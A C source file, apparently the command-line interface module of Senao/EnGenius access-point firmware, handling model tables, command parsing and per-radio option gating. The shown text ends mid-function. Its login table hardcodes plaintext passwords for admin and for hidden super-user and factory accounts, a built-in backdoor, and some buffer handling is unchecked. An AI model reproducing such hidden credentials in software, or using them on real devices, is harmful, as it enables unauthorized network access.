/*****************************************************************************
;
;   (C) Unpublished Work of Senao Networks, Inc.  All Rights Reserved.
;
;       THIS WORK IS AN UNPUBLISHED WORK AND CONTAINS CONFIDENTIAL,
;       PROPRIETARY AND TRADESECRET INFORMATION OF SENAO INCORPORATED.
;       ACCESS TO THIS WORK IS RESTRICTED TO (I) SENAO EMPLOYEES WHO HAVE A
;       NEED TO KNOW TO PERFORM TASKS WITHIN THE SCOPE OF THEIR ASSIGNMENTS
;       AND (II) ENTITIES OTHER THAN SENAO WHO HAVE ENTERED INTO APPROPRIATE
;       LICENSE AGREEMENTS.  NO PART OF THIS WORK MAY BE USED, PRACTICED,
;       PERFORMED, COPIED, DISTRIBUTED, REVISED, MODIFIED, TRANSLATED,
;       ABBRIDGED, CONDENSED, EXPANDED, COLLECTED, COMPILED, LINKED, RECAST,
;       TRANSFORMED OR ADAPTED WITHOUT THE PRIOR WRITTEN CONSENT OF SENAO.
;       ANY USE OR EXPLOITATION OF THIS WORK WITHOUT AUTHORIZATION COULD
;       SUBJECT THE PERPERTRATOR TO CRIMINAL AND CIVIL LIABILITY.
;
;------------------------------------------------------------------------------
;
;    Project : 
;    Creator : 
;    File    : cli.c
;    Abstract: 
;
;       Modification History:
;       By              Date     Ver.   Modification Description
;       --------------- -------- -----  --------------------------------------
;       Norkay            2007-0322       Create
;*****************************************************************************/

/*-------------------------------------------------------------------------*/
/*                        INCLUDE HEADER FILES                             */
/*-------------------------------------------------------------------------*/
#include <sap_osapi.h>
#include <sap_ostypes.h>
#include <gconfig.h>
#include <cli.h>
#include <sysUtil.h>
#include <tokens.h>
#include <apcfg.h>
#include <cmdedit.h>
#include <signal.h>
#include <settings.h>
#include <systeminfo.h>
#include <webaccount.h>


/*-------------------------------------------------------------------------*/
/*                           DEFINITIONS                                   */
/*-------------------------------------------------------------------------*/
#define CLI_COMMAND_SIZE	1024
#define CLI_USER_SIZE		12
#define CLI_MAX_LOGIN_CNT	3


#define SSH_AUTH_SUCCESS_FILE 	"/etc/dropbear/auth_pw_success"
#define SYS_ACCOUNT_FILE 		"/etc/account.conf"

/*-------------------------------------------------------------------------*/
/*                            Local function                               */
/*-------------------------------------------------------------------------*/

/*-------------------------------------------------------------------------*/
/*                           Parameter                                     */
/*-------------------------------------------------------------------------*/
extern T_INT32 autosetbridge;
extern T_INT32 apsecusetbridge;
extern T_INT32 cbsecusetbridge;
extern T_INT32 wdssecusetbridge;
extern T_INT32 ssidpsetbridge;
extern T_INT32 vlanpsetbridge;
extern T_INT32 landhcpsetbridge;
extern T_INT32 dhcpsetbridge;
extern T_INT32 contypesetbridge;


typedef struct _LoginAccountEntry 
{
	T_CHAR name[64];
	T_CHAR pw[64];
	AuthStatus status;
}LoginAccountEntry;

// login table ==> username | password | auth
LoginAccountEntry loginAccList[] = {
#if HAS_PRIORITY_WEB_ACCOUNT
	{ "", 		"", 		AUTH_ANY},
#if (PRIORITY_WEB_ACCOUNT_NUM > 1)
	{ "", 		"", 		AUTH_ANY},
#endif
#if (PRIORITY_WEB_ACCOUNT_NUM > 2)
	{ "", 		"", 		AUTH_ANY},
#endif
#if (PRIORITY_WEB_ACCOUNT_NUM > 3)
	{ "", 		"", 		AUTH_ANY},
#endif
#if (PRIORITY_WEB_ACCOUNT_NUM > 4)
	{ "", 		"", 		AUTH_ANY},
#endif
#else
	{ "admin",  	"admin", 	AUTH_ADMIN},
	{ "EnGeNiUs", 	"EnGeNiUs3558",	AUTH_SUPER}, 
	{ "", 			"", 		AUTH_ANY},
	{ "", 			"", 		AUTH_ANY},
	{ "", 			"", 		AUTH_ANY},
	{ "fa", 		"factory", 	AUTH_FACTORY},
	{ "SeNaORD", 	"svcm", 	AUTH_SUPER},
#endif
};

AuthStatus g_auth; // auth status

T_INT32 g_term_width = 0; // show options use
char Radio_prefix[10]={0}; // used for two radio prefix string

extern CliEntry cmdBasicTable[];

typedef struct __CliHostnameEntry
{
    const T_INT32 hostAntenna;	//for datarate use
    const T_INT32 hostRadio;	//for single-radio or dual-radio use
    const T_INT32 ssidCount_ap;	//for AP wireless interface use
    const T_INT32 ssidCount_apwds;	//for APWDS wireless interface use
    const T_INT32 wdsCount_apwds;	//for APWDS nawds interface use
    const T_INT32 wdsCount_brwds;	//for BRWDS nawds interface use    
    const T_INT32 maxpower;	//for 2.4G txpower use
    const T_INT32 maxpower_5;	//for 5G txpower use
    const T_CHAR* hostName;	//for identify model and use to survey other fields
    const T_INT32 opmode;	//for list all the opmodes which the model offers
    const T_INT32 opmodeCount;	//for cmdopmode errorcheck range when we select the opmode
   
//    const T_INT32 modelID;	//for control the functions which the model offers

//Modify on 2013-09-05 to extend the number of Model to 64
    const long long modelID;

}CliHostnameEntry;

//define HostnameData when add new models
typedef struct __CliHostnamelist
{
	T_INT32 count;					//number of all models	
	CliHostnameEntry CliHostnameTable[54];		//the information of each model
}CliHostnamelist;

CliHostnamelist HostnameData = {
	//sizeof(HostnameData) / sizeof(CliHostnamelist),
	54,
	{
		{1, 2, 4, 4, 4, 4, 27, 0, "enh200", ENH200_OPM, 6, ENH200_ID},
		{1, 2, 4, 4, 4, 4, 27, 0, "enh200ext", ENH200EXT_OPM, 6, ENH200EXT_ID},
		
		{2, 2, 4, 4, 4, 4, 29, 0, "enh202", ENH202_OPM, 6, ENH202_ID},
		{2, 2, 4, 4, 4, 4, 29, 0, "enh202ext", ENH202EXT_OPM, 6, ENH202EXT_ID},
		{2, 2, 8, 8, 4, 8, 29, 0, "enh210", ENH210_OPM, 6, ENH210_ID},
		{2, 2, 8, 8, 4, 8, 29, 0, "enh210ext", ENH210EXT_OPM, 6, ENH210EXT_ID},	
		{2, 2, 4, 4, 4, 4, 26, 0, "ens202", ENS202_OPM, 6, ENS202_ID},
		{2, 2, 4, 4, 4, 4, 26, 0, "ens202ext", ENS202EXT_OPM, 6, ENS202EXT_ID},
		
		{2, 2, 8, 8, 4, 8, 29, 0, "eap350", EAP350_OPM, 4, EAP350_ID},
		{2, 2, 8, 8, 4, 8, 29, 0, "ecb350", ECB350_OPM, 8, ECB350_ID},
		{2, 2, 8, 8, 4, 8, 29, 0, "ecb350true", ECB350TRUE_OPM, 8, ECB350TRUE_ID},
		{1, 2, 4, 4, 4, 4, 27, 0, "era150", ERA150_OPM, 6, ERA150_ID},
		
		{1, 2, 4, 4, 4, 4, 26, 0, "ens200", ENS200_OPM, 6, ENS200_ID},
		{1, 2, 4, 4, 4, 4, 26, 0, "ens200ext", ENS200EXT_OPM, 6, ENS200EXT_ID},	

		{2, 5, 4, 4, 4, 4, 0, 28, "enh500", ENH500_OPM, 6, ENH500_ID},

//Add a new model all0558n on 2013-10-14 which is equivalent to ENH500 and asked by Mars for ALLNET project
		{2, 5, 4, 4, 4, 4, 0, 28, "all0558n", ALL0558N_OPM, 6, ALL0558N_ID},
		
		{2, 5, 4, 4, 4, 4, 0, 28, "enh500ext", ENH500EXT_OPM, 6, ENH500EXT_ID},
		{2, 5, 4, 4, 4, 4, 0, 26, "enh510", ENH510_OPM, 6, ENH510_ID},		
		{2, 5, 4, 4, 4, 4, 0, 26, "ens500", ENS500_OPM, 6, ENS500_ID},		
		{2, 5, 4, 4, 4, 4, 0, 26, "ens500ext", ENS500EXT_OPM, 6, ENS500EXT_ID},		
		
		{1, 5, 4, 4, 4, 4, 0, 27, "erb150an", ERB150AN_OPM, 6, ERB150AN_ID},
	
		{2, 7, 8, 4, 4, 4, 27, 26, "enh700", ENH700_OPM, 5, ENH700_ID},
		{2, 7, 8, 4, 4, 4, 27, 26, "enh700ext", ENH700EXT_OPM, 5, ENH700EXT_ID},
		{2, 7, 8, 4, 4, 4, 27, 26, "enh700plus", ENH700PLUS_OPM, 5, ENH700PLUS_ID},
		
		{2, 7, 8, 4, 4, 4, 29, 26, "eap600", EAP600_OPM, 4, EAP600_ID},
		
//Add a new model all02860nd on 2013-10-22 which is equivalent to EAP600 and asked by Jackey for ALLNET project		
		{2, 7, 8, 4, 4, 4, 29, 26, "all02860nd", ALL02860ND_OPM, 4, ALL02860ND_ID},
		
		{2, 7, 8, 4, 4, 4, 29, 26, "eap600true", EAP600TRUE_OPM, 4, EAP600TRUE_ID},
		{2, 7, 8, 4, 4, 4, 29, 26, "ecb600", ECB600_OPM, 5, ECB600_ID},

//Add a new model all02880nd on 2013-10-22 which is equivalent to EAP600 and asked by Jackey for ALLNET project		
		{2, 7, 8, 4, 4, 4, 29, 26, "all02880nd", ALL02880ND_OPM, 5, ALL02880ND_ID},		
		
		{2, 7, 4, 4, 4, 4, 29, 26, "ap100", AP100_OPM, 5, AP100_ID},		
		{2, 7, 4, 4, 4, 4, 29, 26, "ap200", AP200_OPM, 5, AP200_ID},
		
		{2, 7, 8, 4, 4, 4, 29, 26, "cap4200ag", CAP4200AG_OPM, 4, CAP4200AG_ID},
		{2, 7, 8, 4, 4, 4, 29, 26, "tew-753dap", TEW753DAP_OPM, 4, TEW753DAP_ID},

//Add four new model on 2013-02-07 which is asked by Jacy
		{2, 2, 8, 8, 4, 8, 29, 0, "eap300v2", EAP300V2_OPM, 4, EAP300V2_ID},
		{2, 7, 8, 4, 4, 4, 29, 26, "c600", C600_OPM, 1, C600_ID},
		{3, 7, 8, 4, 4, 4, 29, 26, "c900", C900_OPM, 4, C900_ID},
		{3, 7, 8, 4, 4, 4, 28, 28, "eap900h", EAP900H_OPM, 4, EAP900H_ID},
		{3, 7, 8, 4, 4, 4, 30, 30, "enh900ext", ENH900EXT_OPM, 4, ENH900EXT_ID},
		
//Add a new model on 2013-06-18 which is asked by Jacy and Edward		
		{2, 7, 8, 4, 4, 4, 29, 26, "eap600roots", EAP600ROOTS_OPM, 4, EAP600ROOTS_ID},

//Add three new models on 2013-06-26 which is asked by Jacy
		{3, 7, 8, 4, 4, 4, 29, 26, "c1200", C1200_OPM, 4, C1200_ID},
		{3, 7, 8, 4, 4, 4, 28, 28, "eap1200h", EAP1200H_OPM, 4, EAP1200H_ID},
		{3, 7, 8, 4, 4, 4, 29, 26, "c1750", C1750_OPM, 4, C1750_ID},
		{3, 7, 8, 4, 4, 4, 28, 28, "eap1750h", EAP1750H_OPM, 4, EAP1750H_ID},
		{3, 7, 8, 4, 4, 4, 30, 30, "enh1750ext", ENH1750EXT_OPM, 4, ENH1750EXT_ID},
		
//Add two new models on 2013-11-04 which is asked by Po-Yao
		{2, 7, 8, 4, 4, 4, 29, 26, "ews310ap", EWS310AP_OPM, 1, EWS310AP_ID},
		{2, 7, 8, 4, 4, 4, 29, 26, "ews311ap", EWS311AP_OPM, 1, EWS311AP_ID},

//Add two new models on 2013-12-04 which is equivalent to EAP900H and asked by John
		{3, 7, 8, 4, 4, 4, 28, 28, "ews320ap", EWS320AP_OPM, 1, EWS320AP_ID},
		{3, 7, 8, 4, 4, 4, 28, 28, "ews321ap", EWS321AP_OPM, 1, EWS321AP_ID},
		
//Add two new models on 2013-12-04 which is equivalent to EAP1200H and asked by John		
		{3, 7, 8, 4, 4, 4, 28, 28, "ews610ap", EWS610AP_OPM, 1, EWS610AP_ID},		
		{3, 7, 8, 4, 4, 4, 28, 28, "ews611ap", EWS611AP_OPM, 1, EWS611AP_ID},
		
//Add two new models on 2013-12-04 which is equivalent to EAP1750H and asked by John		
		{3, 7, 8, 4, 4, 4, 28, 28, "ews620ap", EWS620AP_OPM, 1, EWS620AP_ID},
		{3, 7, 8, 4, 4, 4, 28, 28, "ews621ap", EWS621AP_OPM, 1, EWS621AP_ID},				
								
		{2, 7, 8, 4, 4, 4, 28, 26, "ecb1200", ECB1200_OPM, 5, ECB1200_ID},
		{3, 7, 8, 4, 4, 4, 28, 28, "ecb1750", ECB1750_OPM, 5, ECB1750_ID},
				
	}
};


int gTelnetOnWindowDos = 0;

CliEntry *cmdTable = cmdBasicTable;

//Modify by Philips and Yenger on 20120502 to declare data struct for command prompt and command path
	T_CHAR CMD_PROMPT[CLI_COMMAND_SIZE]=""; /*used for command prompt*/
	T_CHAR cmdpath[CLI_COMMAND_SIZE]; /*used for "?" */
	T_CHAR promptpath[CLI_COMMAND_SIZE]; 
	T_CHAR cmdinput[12][255]={"", "", "", "", "", "", "", "", "", "", "", ""}; /*used to keep the whole input command line. e.g:mgmt admin */
	T_INT32 cmdtreelevel=0; /*used to keep the level of input command. e.g:the level of (mgmt admin) is 2*/


/*-------------------------------------------------------------------------*/
/*                           Model Global Variable                                     */
/*-------------------------------------------------------------------------*/
	T_CHAR model_name[CLI_COMMAND_SIZE];
	
//	T_INT32 model_ID=-1;
	
	//Modify on 2013-09-05 to extend the number of Model to 64
	long long model_ID=-1;	
	
	T_UINT32 current_opmode=OPM_ALL; //OPM_ALL;
	T_UINT32 current_opmode_2=OPM_ALL; //OPM_ALL;
	T_UINT32 current_opmode_5=OPM_ALL; //OPM_ALL;
	T_INT32 model_radio;//2, 5, 7 for identify model's radio
	T_CHAR current_radio_flag[5];//2.4G, 5G for identify which radio is using (only for dual-radio)

T_CHAR globalCommandLine[1024];

//Modify by Philips on 2013-04-25 to handle Segment fault caused by absloute path command "wless2 network ssidp 2 traffic"
T_INT32 absolute=0;


/*****************************************************************
* NAME: getNextToken
* ---------------------------------------------------------------
* FUNCTION: 
* INPUT:    
* OUTPUT:   
* Author:   
* Modify:   
****************************************************************/
__inline const T_CHAR* getNextToken(const CliData* cliData, const T_INT32 idx)
{
	return (cliData->argc-idx) > 0 ? cliData->tokens[cliData->curLv+(idx+1)].token : "(null)";
}
/*****************************************************************
* NAME: getCommandName
* ---------------------------------------------------------------
* FUNCTION: 
* INPUT:    
* OUTPUT:   
* Author:   
* Modify:   
****************************************************************/
__inline static const T_CHAR* getCommandName(const CliData* cliData)
{
	return cliData->tokens[cliData->curLv].entry->cmdName;
}
/*****************************************************************
* NAME: getPriv
* ---------------------------------------------------------------
* FUNCTION: 
* INPUT:    
* OUTPUT:   
* Author:   Norkay 2007-03-29
* Modify:   
****************************************************************/
__inline static const T_CHAR* getPriv(const CliData* cliData)
{
	return cliData->tokens[cliData->curLv].entry->priv;
}
/*****************************************************************
* NAME: getHandler
* ---------------------------------------------------------------
* FUNCTION: 
* INPUT:    
* OUTPUT:   
* Author:   Norkay 2007-03-29
* Modify:   
****************************************************************/
__inline static CliHandle getHandler(const CliData* cliData)
{
	return cliData->tokens[cliData->curLv].entry->handler;
}
/*****************************************************************
* NAME: getDescription
* ---------------------------------------------------------------
* FUNCTION: 
* INPUT:    
* OUTPUT:   
* Author:   
* Modify:   
****************************************************************/
__inline static const T_CHAR* getDescription(const CliData* cliData)
{
	return cliData->tokens[cliData->curLv].entry->description;
}
/*****************************************************************
* NAME: getUsage
* ---------------------------------------------------------------
* FUNCTION: 
* INPUT:    
* OUTPUT:   
* Author:   
* Modify:   
****************************************************************/
__inline static const T_CHAR* getUsage(const CliData* cliData)
{
	return cliData->tokens[cliData->curLv].entry->usage;
}
/*****************************************************************
* NAME: getStdInCommand
* ---------------------------------------------------------------
* FUNCTION: Get Stdin String
* INPUT:    srcLen
* OUTPUT:   srcBuf
*			return command size
* Author:   Norkay 2007-04-03
* Modify:   
****************************************************************/
T_INT32 getStdInCommand(T_CHAR* srcBuf, T_INT32 srcLen)
{
	T_CHAR buf[128];
	T_INT32 len;

	//protect
	if(!srcBuf || srcLen <= 0) 
	{
		return 0;
	}

	fgets(buf, sizeof(buf), stdin);

	/* FIX: Window telnet! */
	if(gTelnetOnWindowDos)
	{
		if(buf[0] == '\n')
		{
			fgets(buf, sizeof(buf), stdin);
		}
	}

	len = strlen(buf)-1; //   '\n'
	len = srcLen > len ? len : srcLen;
	memcpy(srcBuf, buf, len);
	srcBuf[len] = '\0';

	return len;
}
/*****************************************************************
* NAME: getApCfgStructureListShow
* ---------------------------------------------------------------
* FUNCTION: print list enable event
* INPUT:    
* OUTPUT:   
* Author:   Norkay            2007-04-10
* Modify:   
****************************************************************/
T_INT32 getApCfgStructureListShow(const T_CHAR* strPrefix, const T_CHAR* tokenPrefix, const T_INT32 numofTokens)
{
	T_CHAR buf[128];
	T_CHAR tok[40];
	T_INT32 i;
	T_INT32 len = 0;
	T_INT32 cnt = 0;

	tprintf("%s: ", strPrefix);
	for(i = 1; i <= numofTokens; i++)
	{
		sprintf(tok, "%s%d", tokenPrefix, i);
		if(apCfgGetFirstByte(tok))
		{
			cnt++;
			len += sprintf(buf + len, " %d,", i);
		}
	}
	if(cnt==0)
	{
		sprintf(buf, "---");
	}
	else
	{
		buf[len-1] = '.';
	}
	tprintf("%s\n", buf);

	return cnt;
}



/*****************************************************************
* NAME: showOption
* ---------------------------------------------------------------
* FUNCTION: Show options: 
*			1.if type is enum data, option is idx+text
*			2.if type has warning message, options is warning message. 
* INPUT:    
* OUTPUT:   
* Author:   Norkay 2007-03-29
* Modify:   
****************************************************************/
T_VOID showOption(const T_CHAR* token)
{
	int enumsize;
	const T_CHAR* options = NULL;

	options = apCfgGetWarnings(token);

	if(options)
	{
		int optionLen = strlen(options);

		if( optionLen> g_term_width-CLI_TITLE_WIDTH)
		{
			int tailLen = optionLen; // size of still not print
			int w = g_term_width-CLI_TITLE_WIDTH; // search from 'w'
			T_CHAR buf[g_term_width];
			const T_CHAR *ptr = options;

			while(tailLen > 0)
			{
				// search " " to jump line
				while(ptr[w] != ' ' && ptr[w] != '\0' && w > 0)
				{
					w--;
				}

				strncpy(buf, ptr, w);
				buf[w] = '\0';
				tailLen -= (w+1);
				ptr = &ptr[w+1];
				w = tailLen > (g_term_width-CLI_TITLE_WIDTH) ? (g_term_width-CLI_TITLE_WIDTH) : tailLen;
				tprintf("%s%s\n", CLI_TITLE_SPACE, buf);
			}
		}
		else
		{
			tprintf("%s%s\n", CLI_TITLE_SPACE, options);
		}
		return;
	}

	enumsize = apCfgGetEnumDataSize(token);

	if(enumsize)
	{
		int msgLen, i;
		const apCfgItemNameSet* itemset = apCfgGetEnumData(token, 0);
		int type = apCfgGetEnumType(token);

		msgLen = tprintf("%s%d:%s", CLI_TITLE_SPACE, itemset->id, itemset->text);

		for(i=1; i<enumsize; ++i)
		{
            itemset = apCfgGetEnumData(token, i);

			if((msgLen + strlen(itemset->text) > g_term_width-CLI_RESERVE_WIDTH) || 
               /* except type */
			   type == TYPE_TIMEZONE)
			{

				// jump line --> msgLen > g_term_width-CLI_RESERVE_WIDTH 
				tprintf("\n");
				msgLen = tprintf("%s%d:%s", CLI_TITLE_SPACE, itemset->id, itemset->text);
			}
			else
			{

				// add ", "
				msgLen += tprintf(", %d:%s", itemset->id, itemset->text);

			}
		}
		tprintf("\n");

		return;
	}

	tprintf("Err: This token '%s' have no warnings, please check!\n", token);
	return;
}
/*****************************************************************
* NAME: showMenuPath
* ---------------------------------------------------------------
* FUNCTION: show Menu Path
* INPUT:    
* OUTPUT:   
* Author:   Norkay 2007-04-11
* Modify:   
****************************************************************/
static T_VOID showMenuPath(CliData* cliData)
{
//printf("Called %s\n",__func__);
	T_INT32 i;

	// when the input is blank space, ignore it.
	if (cliData->tokens == NULL || cliData->tokens[0].entry == NULL) 
	{
		return;
	}
	tprintf("  %s", cliData->tokens[0].entry->description);

	for(i=1; i <= cliData->curLv; ++i)
	{
		tprintf(" --> %s", cliData->tokens[i].entry->description);
	}
	tprintf("\n");
}

/*****************************************************************
* NAME: setApCfgValue
* ---------------------------------------------------------------
* FUNCTION: 
* INPUT:    
* OUTPUT:   
* Author:   
* Modify:   Norkay 2007-03-29
****************************************************************/
CliStatus setApCfgValue(T_VOID* priv, CliData* cliData)
{ 
	const T_CHAR* apCfgToken = (const T_CHAR*)priv;
	const T_CHAR* oldText="AP MODE";
	const T_CHAR* newText;


//	oldText = (const T_CHAR*)apCfgGetItemText(apCfgToken);



	newText = getNextToken(cliData, 0);

    tprintf(CLI_CMD_NAME, getCommandName(cliData), getDescription(cliData));

	if(strlen(getUsage(cliData)))
	{

		tprintf(CLI_CMD_USAGE, getUsage(cliData));
	}

	// pritf Options
	showOption(getPriv(cliData));

	tprintf(" --------------------------\n");
	if(cliData->argc==0)
	{
		tprintf("%10s: %s\n", "Value", oldText);
		return CLI_NOTHING;
	}

	if(cliData->argc!=1)
	{
		return CLI_PARAMS_ERR;
	}

	tprintf("%10s: %s\n", "Old Value", oldText);
	if(apCfgSetValueByStr(apCfgToken, newText))
	{
		tprintf("%10s: %s\n", "New Value", apCfgGetItemText(apCfgToken));
	}
	else
	{
		return CLI_PARAMS_ERR;
	}
	return CLI_OK;
}
#if HAS_RADIO_SETTING
T_INT32 ParseRadioMode(T_INT32 radiomode)
{
	T_INT32 mode;

	switch(radiomode)
	{
	case RADIO_OPM_AP:
	case RADIO_OPM_REPEATER_AP:
		mode = (apCfgGetIntValue(ETH_PURPOSE_TOK)==ETH_PURPOSE_WAN)?SYS_OPM_AR:SYS_OPM_AP;
		break;
	case RADIO_OPM_CB:
	case RADIO_OPM_REPEATER_STA:
		mode = SYS_OPM_CB;
		break;
	case RADIO_OPM_CR:
		mode = SYS_OPM_CBRT;
		break;
	case RADIO_OPM_WDSB:
	case RADIO_OPM_WDSR:
		mode = SYS_OPM_WDSB;
		break;
	case RADIO_OPM_DISABLE:
		mode = -1;
		break;
	default:
		mode = SYS_OPM_AP;
		break;
	}
	if ((mode>=0)&&(mode<SYS_OPM_COUNT))
	{
		return 1<<mode;
	}
	else
		return -1;
}
#endif
/*****************************************************************
* NAME: getNextTable
* ---------------------------------------------------------------
* FUNCTION: 
* INPUT:    
* OUTPUT:   
* Author:   
* Modify:   
****************************************************************/
CliStatus getNextTable(T_VOID* priv, CliData* cliData)
{
//printf("Called %s\n",__func__);
//int i;
	CliEntry* pTable = (CliEntry*) priv;
	T_INT32 cnt = 0;
	T_INT32 curlv;
#if HAS_RADIO_SETTING
	T_INT32 radiomode;
#endif
	const T_CHAR* usrToken;

//printf("in getNextTable_cliData->argc=%d\n", cliData->argc);
	if(cliData->argc < 0)
	{
		return CLI_NO_MATCH;
	}

	/*display help*/
	if(cliData->argc==0)
	{

//Modify by Philips on 2013-04-25 to handle Segment fault caused by absloute path command "wless2 network ssidp 2 traffic" 
//		showMenuPath(cliData);

		if ( absolute==0 )
			showMenuPath(cliData);
				      
		return cmdHelp(pTable,cliData);

	}
	curlv = cliData->curLv = (cliData->tokenLen - cliData->argc);
	usrToken = (cliData->argc>0) ? cliData->tokens[curlv].token : "";
	//printf("curlv=%d, cliData->tokenLen=%d, cliData->argc=%d, usrToken='%s'\n", curlv, cliData->tokenLen, cliData->argc, usrToken);

    while(CMD_END_TAG!= pTable[cnt].opMode){
//printf("in while__cnt=%d_pTable[cnt].cmdName=%s\n", cnt, pTable[cnt].cmdName);    
        
        if(strcmp(usrToken, pTable[cnt].cmdName)==0){

//Modify for AP100 on 2012-11-09
if ( strcmp(model_name, "ap100")!=0  )

//set opmodes and flag for dual-radio when user enter the following commands	
//otherwise user can excute the commands which should not be displayed
//EX: BR/AP can excute climit2 or vlan2
if ( model_radio==7 ) {

	//Modify on 2012-11-20 to add TC rate ratio
	if( (strcmp(usrToken, "ratio2")==0) || (strcmp(usrToken, "outlimit2")==0) ){
		strcpy(current_radio_flag, "2.4G");
		if ( model_radio==7 )
			cliData->mode = current_opmode_2;
	}
	if( (strcmp(usrToken, "ratio5")==0) || (strcmp(usrToken, "outlimit5")==0) ){
		strcpy(current_radio_flag, "5G");
		if ( model_radio==7 )
			cliData->mode = current_opmode_5;
	}
	
	if ( strcmp(usrToken, "opmode2")==0 || strcmp(usrToken, "vlan2")==0 || strcmp(usrToken, "ratec2")==0 || strcmp(usrToken, "climit2")==0 ) {
		strcpy(current_radio_flag, "2.4G");
		cliData->mode = current_opmode_2;
	}
	if ( strcmp(usrToken, "opmode5")==0 || strcmp(usrToken, "vlan5")==0 || strcmp(usrToken, "ratec5")==0 || strcmp(usrToken, "climit5")==0 ) {
		strcpy(current_radio_flag, "5G");
		cliData->mode = current_opmode_5;
	}
	
	//mvlan can not be setting when current_opmode_5 is not AP or WDSAP
	if (strcmp(usrToken, "mvlan")==0 && ( current_opmode_2==OPM_AP || current_opmode_2==OPM_WDSAP ) ){
		strcpy(current_radio_flag, "2.4G");
		cliData->mode = current_opmode_2;
	}	
	//mvlan can not be setting when current_opmode_2 is not AP or WDSAP
	if (strcmp(usrToken, "mvlan")==0 && ( current_opmode_5==OPM_AP || current_opmode_5==OPM_WDSAP ) ){
		strcpy(current_radio_flag, "5G");
		cliData->mode = current_opmode_5;
	}

	//client2 can not be setting when current_opmode_2 is not AP or WDSAP or RP or AR
	if (strcmp(usrToken, "client2")==0 && ( current_opmode_2==OPM_AP || current_opmode_2==OPM_WDSAP || current_opmode_2==OPM_AR || current_opmode_2==OPM_RP ) ){
		strcpy(current_radio_flag, "2.4G");
		cliData->mode = current_opmode_2;
	}	
	//client5 can not be setting when current_opmode_5 is not AP or WDSAP or RP or AR
	if (strcmp(usrToken, "client5")==0 && ( current_opmode_5==OPM_AP || current_opmode_5==OPM_WDSAP || current_opmode_5==OPM_AR || current_opmode_5==OPM_RP ) ){
		strcpy(current_radio_flag, "5G");
		cliData->mode = current_opmode_5;
	}
	
	//wdslist2 can not be executed when current_opmode_2 is not WDSAP or WDSB
	if (model_radio==7 && strcmp(usrToken, "wdslist2")==0 && ( current_opmode_2==OPM_WDSAP || current_opmode_2==OPM_WDSB ) ){
		strcpy(current_radio_flag, "2.4G");
		cliData->mode = current_opmode_2;
	}
	//wdslist5 can not be executed when current_opmode_5 is not WDSAP or WDSB
	if ( model_radio==7 && strcmp(usrToken, "wdslist5")==0 && ( current_opmode_5==OPM_WDSAP || current_opmode_5==OPM_WDSB ) ){
		strcpy(current_radio_flag, "5G");
		cliData->mode = current_opmode_5;
	}
	
	//radio2 can not be setting when current_opmode_2 is not AP
	if (strcmp(usrToken, "radio2")==0 && ( current_opmode_2==OPM_AP ) ){
		strcpy(current_radio_flag, "2.4G");
		cliData->mode = current_opmode_2;
	}	
	//radio5 can not be setting when current_opmode_5 is not AP
	if (strcmp(usrToken, "radio5")==0 && ( current_opmode_5==OPM_AP ) ){
		strcpy(current_radio_flag, "5G");
		cliData->mode = current_opmode_5;
	}

}

		
			if(pTable[cnt].authority <= g_auth) // Check authority for Auth control
			{

#if HAS_VLAN_SUPPORT
				if(strcmp(pTable[cnt].cmdName, "vlan")==0)
				{

					if(!(current_opmode&OPM_AP))
					{
					
						return CLI_NO_MATCH;
					}
				}
#endif
#if HAS_RADIO_SETTING
				if(strcmp(pTable[cnt].cmdName, "radio1")==0)
				{

					radiomode=ParseRadioMode(apCfgGetIntValue(RADIO_1_OP_MODE_TOK));
					if(radiomode!=-1)
					{
						cliData->mode = radiomode;
						apCfgSetIntValue(RADIO_SELECTED_TOK,0);
						strcpy(Radio_prefix,ATH_TOK);
					}
					else
					{
						tprintf("This radio is disabled!\n");
						return CLI_PARAMS_ERR;
					}

				}
				else if(strcmp(pTable[cnt].cmdName, "radio2")==0)
				{	

					radiomode=ParseRadioMode(apCfgGetIntValue(RADIO_2_OP_MODE_TOK));
					if(radiomode!=-1)
					{
						cliData->mode = radiomode;
						apCfgSetIntValue(RADIO_SELECTED_TOK,1);
						strcpy(Radio_prefix,WLAN_TOK);
					}
					else
					{
						tprintf("This radio is disabled!\n");
						return CLI_PARAMS_ERR;
					}
				}
#endif
//printf("pTable[cnt].modelID=%lld, model_ID=%lld\n", pTable[cnt].modelID, model_ID);
//printf("pTable[cnt].opMode=%d, pTable[cnt].modelID=%lld\n", pTable[cnt].opMode, pTable[cnt].modelID);
//printf("cliData->mode=%d, model_ID=%lld\n", cliData->mode, model_ID);
				if( (pTable[cnt].opMode & cliData->mode) && (pTable[cnt].modelID & model_ID) )
				{
					//Modify by Philips and Yenger on 20120904 to let band steer only work under AP/AP or APWDS/APWDS
					if ( strcmp(pTable[cnt].cmdName, "bsteer")==0 && current_opmode_2!=current_opmode_5 )
						return CLI_NO_MATCH;
						
		//Modify for AP100 on 2012-11-07
		if ( strcmp(model_name, "ap100")==0  ){
		
//printf("model_name=%s\n", model_name);
//printf("current_radio_flag=%s\n", current_radio_flag);
//printf("strcmp(pTable[cnt].cmdName=%s\n", pTable[cnt].cmdName);
//printf("pTable[cnt].modelID=%d\n", pTable[cnt].modelID);
//printf("MODEL_2G=%d, MODEL_5G=%d\n", MODEL_2G, MODEL_5G);
	
			//Disable the command belong to MODEL_5G when current_radio_flag is 2.4G
			if ( (strcmp(current_radio_flag, "2.4G")==0) && ((pTable[cnt].modelID==MODEL_5G) || (strcmp(pTable[cnt].cmdName, "opmode5")==0)) ) {
				return CLI_NO_MATCH;
			}
			//Disable the command belong to MODEL_2G when current_radio_flag is 5G			
			if ( (strcmp(current_radio_flag, "5G")==0) && ((pTable[cnt].modelID==MODEL_2G) || (strcmp(pTable[cnt].cmdName, "opmode2")==0)) ){
				return CLI_NO_MATCH;
			}	
		}

			//Modify for function alignment of Client Control for EAP600 on 2012-12-04
			//Disable the command belong to MODEL_5G when current_radio_flag is 2G
			if (  model_radio==7 && (strcmp(cliData->tokens[0].token, "wless2")==0) && (strcmp(pTable[cnt].cmdName, "climit5")==0) ){
				return CLI_NO_MATCH;
			}
			if (  model_radio==2 && (strcmp(pTable[cnt].cmdName, "climit5")==0) ){
				return CLI_NO_MATCH;
			}			
			//Modify for function alignment of Client Control for EAP600 on 2012-12-04
			//Disable the command belong to MODEL_2G when current_radio_flag is 5G
			if (  model_radio==7 && (strcmp(cliData->tokens[0].token, "wless5")==0) && (strcmp(pTable[cnt].cmdName, "climit2")==0) ){
				return CLI_NO_MATCH;
			}
			if (  model_radio==5 && (strcmp(pTable[cnt].cmdName, "climit2")==0) ){
				return CLI_NO_MATCH;
			}
			//Modify for EAP600 on 2013-02-08
			//wdslist2 can not be executed when current_opmode_2 is not WDSAP or WDSB
